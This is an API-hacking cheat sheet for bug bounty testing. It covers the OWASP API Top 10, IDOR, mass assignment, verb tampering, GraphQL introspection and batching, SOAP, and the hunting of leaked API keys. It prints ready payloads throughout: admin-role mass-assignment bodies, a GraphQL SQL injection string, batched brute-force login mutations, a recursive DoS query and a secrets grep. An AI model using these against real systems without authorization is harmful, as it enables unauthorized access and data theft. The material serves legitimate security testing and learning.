# API Hacking
> Sources: Bug Bounty Bootcamp (Li), Real-World Bug Hunting (Yaworski), OWASP API Top 10, WSTG v4.2

## API Types Overview

| Type | Protocol | Format | Notes |
|---|---|---|---|
| REST | HTTP | JSON/XML | Most common, stateless |
| SOAP | HTTP | XML | Enterprise, WSDL schema |
| GraphQL | HTTP | JSON | Flexible queries, often verbose |
| gRPC | HTTP/2 | Protobuf | High performance, binary |
| WebSockets | WS | Any | Real-time, bidirectional |

---

## OWASP API Top 10

```
API1: Broken Object Level Authorization → IDOR (access other users' objects)
API2: Broken Authentication → Weak tokens, no rate limit on auth endpoints
API3: Broken Object Property Level Authorization → Mass assignment, excessive data exposure
API4: Unrestricted Resource Consumption → No rate limit, no size limit, no pagination limits
API5: Broken Function Level Authorization → Admin functions accessible to regular users
API6: Unrestricted Access to Sensitive Business Flows → Race conditions, workflow bypass
API7: Server-Side Request Forgery → URLs accepted by server fetched server-side
API8: Security Misconfiguration → Default creds, verbose errors, unnecessary HTTP methods
API9: Improper Inventory Management → Shadow APIs, deprecated versions (/v1 vs /v2)
API10: Unsafe Consumption of APIs → Trust third-party APIs without input validation
```

---

## REST API Testing

### Authentication & Authorization
```bash
# Test unauthenticated access
curl https://api.example.com/v1/users

# Test with another user's token
curl -H "Authorization: Bearer OTHER_USER_TOKEN" https://api.example.com/v1/me

# Test IDOR on resource IDs (see 06-idor.md)
curl https://api.example.com/v1/users/1234
curl https://api.example.com/v1/users/1235

# Test for no auth on sensitive endpoints
curl https://api.example.com/v1/admin/users
```

### Rate Limiting
```bash
for i in {1..100}; do
  curl -s -o /dev/null -w "%{http_code} " \
    https://api.example.com/v1/login \
    -d '{"username":"admin","password":"wrong"}'
done
# If all return 200/401 (not 429) → no rate limiting → brute force possible
```

### Mass Assignment
```bash
# Normal update:
PATCH /api/v1/users/me
{"displayName": "My New Name"}

# Mass assignment attack:
PATCH /api/v1/users/me
{"displayName": "Attacker", "role": "admin", "is_verified": true, "credits": 9999}

# During registration:
POST /api/v1/users
{"email": "test@test.com", "password": "pass123", "role": "admin", "isAdmin": true}
```

### HTTP Method Manipulation
```bash
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  echo "$method:"
  curl -s -o /dev/null -w "%{http_code}" \
    -X $method https://api.example.com/v1/users/1234
  echo ""
done
```

### Verb Tampering
```bash
# If GET is blocked but PUT/PATCH isn't:
GET /api/admin/users → 403
PUT /api/admin/users/1234 → 200?

# If state-changing action accessible via GET:
GET /api/v1/transfer?to=attacker&amount=1000
```

---

## API Versioning Bypass

Older API versions often lack newer security controls:
```bash
# Try old API versions
curl https://api.example.com/v1/users/secret  → 403
curl https://api.example.com/v2/users/secret  → 403
curl https://api.example.com/v0/users/secret  → 200 (older, less secure)
curl https://api.example.com/beta/users/secret

# Also try:
/api/2/, /api/2021-01/, /api/old/, /api/internal/
/api/preview/, /api/test/

# Mobile API endpoints (often less secured):
/mobile/api/, /app/api/, /api/mobile/
```

---

## GraphQL Testing

### Introspection (Enumerate All Types and Queries)
```bash
# Full introspection:
curl -s https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name kind description fields { name args { name type { name kind } } type { name kind } } } } }"}'

# Simple version:
curl -s https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name description } } } }"}'
```

### GraphQL Attack Techniques
```graphql
# 1. IDOR via GraphQL
{ user(id: "OTHER_USER_ID") { email phone creditCards { number cvv } } }

# 2. Nested object IDOR
{ order(id: "123") { user { id email allOrders { items total } } } }

# 3. Batch query abuse (rate limit bypass for login brute force)
mutation {
  alias1: login(username: "admin", password: "pass1") { token }
  alias2: login(username: "admin", password: "pass2") { token }
  alias3: login(username: "admin", password: "pass3") { token }
}

# 4. SQL injection in arguments
{ "query": "{ users(filter: \"1' OR '1'='1\") { email } }" }

# 5. Nested query DoS (deep recursion)
{ user { posts { comments { author { posts { comments { author { id } } } } } } } }

# 6. Field suggestion (server suggests real field names for typos)
{ uzer { id } }  # Server might respond: "Did you mean 'user'?"
```

### GraphQL Introspection Bypass
```bash
# If introspection blocked, try:
{"query":"\n  query IntrospectionQuery { __schema { queryType { fields { name } } } }"}
{"query":"{ __typename }"}

# Field enumeration via suggestions:
{"query":"{ user { nonexistentField } }"}
# Error might say: "Did you mean 'password'?"
```

### GraphQL Tools
```bash
# InQL (Burp extension) — full GraphQL tester
# GraphQL Voyager — visualize schema

# graphql-cop — security audit
python3 graphql-cop.py -t https://target.com/graphql

# Clairvoyance — recover schema without introspection
clairvoyance -u https://target.com/graphql -w wordlist.txt -o schema.json
```

---

## SOAP API Testing

```bash
# Get WSDL (API schema)
curl https://target.com/service?wsdl

# Craft SOAP request manually
curl -s https://target.com/soap \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <ns:GetUser>
      <userId>1</userId>
    </ns:GetUser>
  </soapenv:Body>
</soapenv:Envelope>'

# Test for XXE in SOAP body (see 11-xxe.md)
# Test for SQLi in parameters
# Test for IDOR in userId
```

---

## API Key Discovery & Testing

```bash
# Find API keys in JavaScript
curl -s https://target.com/app.js | grep -E '(api_key|apikey|api-key|access_key|secret|token)["\s]*[:=]["\s]*[a-zA-Z0-9_-]{10,}'

# Test leaked API key
curl https://api.target.com/v1/data -H "X-API-Key: LEAKED_KEY"

# Test if key has broader scope than expected
curl https://api.target.com/v1/admin -H "X-API-Key: LEAKED_KEY"
```

---

## Common API Authentication Weaknesses

```bash
# 1. API key in URL (gets logged in server logs, Referer headers)
/api/data?api_key=SECRET

# 2. API key not validated (any value accepted)
X-API-Key: ANYTHING

# 3. Weak JWT (see 16-sso-oauth.md)

# 4. No auth required on sensitive endpoints
GET /api/v1/admin/users → returns all users (no auth)

# 5. Token reuse after logout
# Save token → logout → try to use saved token
```

---

## API Documentation Attack Surface

```bash
# Swagger/OpenAPI reveals all endpoints
curl https://target.com/swagger.json | jq '.paths | keys'
curl https://target.com/openapi.yaml

# Parse all paths and test each:
curl https://target.com/swagger.json | python3 -c "
import sys, json
data = json.load(sys.stdin)
for path in data.get('paths', {}).keys():
    print(path)
"
```

---

## Burp Suite API Workflow

1. Enable Burp proxy
2. Browse/use the API normally
3. Proxy → HTTP history, filter by `api/` paths
4. For each endpoint, Send to Repeater
5. Test IDOR (change IDs)
6. Test method switching
7. Test parameter pollution
8. Test auth bypass (remove/change auth header)
9. Install InQL for GraphQL introspection

---

## Testing Checklist
- [ ] Get API schema (Swagger, WSDL, GraphQL introspection)
- [ ] Map all endpoints and methods
- [ ] Test authentication (missing, weak JWT, key bypass)
- [ ] Test IDOR on all resource IDs
- [ ] Test mass assignment (extra fields: role, isAdmin, credits)
- [ ] Test rate limiting on auth endpoints
- [ ] Test all HTTP methods (verb tampering)
- [ ] Test older API versions (/v1, /v0, /beta, /mobile)
- [ ] Test GraphQL batch attacks and introspection
- [ ] Search for API keys in JavaScript files
- [ ] Test CORS on API endpoints
- [ ] Check for BFLA (broken function-level auth) on /admin endpoints

## Severity
- **Medium**: Information disclosure via API
- **High**: IDOR reading other users' data
- **High**: Mass assignment → privilege escalation
- **Critical**: Authentication bypass → full access
